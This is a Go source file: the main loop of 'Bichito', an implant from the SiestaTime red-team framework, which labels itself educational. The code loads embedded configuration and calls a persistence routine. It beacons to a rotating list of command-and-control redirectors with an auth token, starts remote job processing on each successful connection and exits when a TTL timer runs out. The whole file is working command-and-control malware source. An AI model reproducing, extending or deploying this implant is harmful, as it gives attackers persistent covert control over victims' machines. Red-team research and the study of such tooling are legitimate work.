//{{{{{{{ Bichito Main }}}}}}}

//// Bichito is the Implant from SiestaTime Framework

//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (
	"encoding/json"	
	"strconv"
	"bichito/modules/network"
	"bichito/modules/persistence"
	"bytes"
	"time"
	"os"
	"strings"
	"fmt"
	"sync"
)

// Structures to decode basic Bichito Parameters
type BiConfig struct {
    Ttl string   `json:"ttl"`
    Resptime   string `json:"resptime"`
    Token string `json:"token"`
    Coms string   `json:"coms"`
    Persistence string `json:"persistence"`
}

type BiAuth struct {
    Bid string   `json:"bid"`
    Token string  `json:"token"`  
}

type Job struct {
    Cid  string   `json:"cid"`              // The client CID triggered the job
    Jid  string   `json:"jid"`              // The Job Id (J-<ID>), useful to avoid replaying attacks
    Pid string   `json:"pid"`               // Parent Id, when the job came completed from a Implant, Pid is the Redirector where it cames from
    Chid string `json:"chid"`               // Implant Id
    Job string   `json:"job"`               // Job Name
    Time  string   `json:"time"`            // Time of creation
    Status  string   `json:"status"`        // Sent - Processing - Finished
    Result  string   `json:"result"`        // Job output data
    Parameters string   `json:"parameters"` // Parameters will be JSON serialized to provide flexibility
}

type JobsToHive struct {
	mux  sync.RWMutex
	Jobs []*Job
}

type JobsToProcess struct {
	mux  sync.RWMutex
	Jobs []*Job
}


//Useful structures that will be present on memory till TTL or implant termination
var(
	parameters string

	biconfig *BiConfig 
	ttl int
	resptime int
	bid string
	authbearer string
	redirectors []string

	jobsToHive	*JobsToHive
	jobsToProcess *JobsToProcess	

	sysinfo bool

	ttlC *time.Timer
)


func main() {
	var result string

	//Decode Redirector Parameters
	errDaws := json.Unmarshal([]byte(parameters),&biconfig)
	if errDaws != nil {
		fmt.Println("Parameters JSON Decoding error:"+errDaws.Error())
		os.Exit(1)
	}
	ttl,_ = strconv.Atoi(biconfig.Ttl)
	resptime,_ = strconv.Atoi(biconfig.Resptime)

	//Initialize on memory slices for redirect Jobs
	var jobs []*Job
	jobsToHive	= &JobsToHive{Jobs:jobs}
	jobsToProcess = &JobsToProcess{Jobs:jobs}


	//TO-DO: Persistence
	errorP,resultP := persistence.Persistence()
	if errorP{
		addLog("Persistence not possible:"+resultP)
	}

	sysinfo = false
	//Prepare Network Module: Decode Json data and redirectors to set them on memory
	redirectors = network.PrepareNetworkMocule(biconfig.Coms)

	//Prepare Pre-Checked Authentication for Implant
	biauth := BiAuth{"",biconfig.Token}
	bufRP := new(bytes.Buffer)
	json.NewEncoder(bufRP).Encode(biauth)
	resultRP := bufRP.String()
	authbearer = resultRP 
	authbearer = strings.TrimSuffix(authbearer, "\n")

	ttlC = time.NewTimer(time.Duration(ttl) * time.Second)
	contChannel := make(chan string, 1)
	
	var swapCount int
	//Try to connect to any redirectors and process jobs. 
	//Repeat each respTime and reset TTL on sucessful connection
	for {
		result = "Empty"
		go func(){
			result = connectOut()
			fmt.Println("Weird:"+result)
			if result == "Success"{
				ttlC.Reset(time.Duration(ttl) * time.Second)
				swapCount = 0
				go jobProcessor()
				contChannel <- "True"
			}else{
				swapCount++
				if swapCount == 4 {
					//Log Error and Sort redirectors
					addLog(result)

					//Put used redirector to the last element in slice [used...] to [next...used]
					usedSave := redirectors[0]
					redirectors = redirectors[1:]
					redirectors = append(redirectors,usedSave)
					swapCount = 0
				}

				contChannel <- "True"
			}
		}()
		// Select connected, continue trying to connect or Timeout
		select{
			case <- contChannel:
				time.Sleep(time.Duration(resptime) * time.Second)
				
			case <- ttlC.C:
				fmt.Println("ttl")
				fmt.Println(result)
				os.Exit(1)
		}
	}
}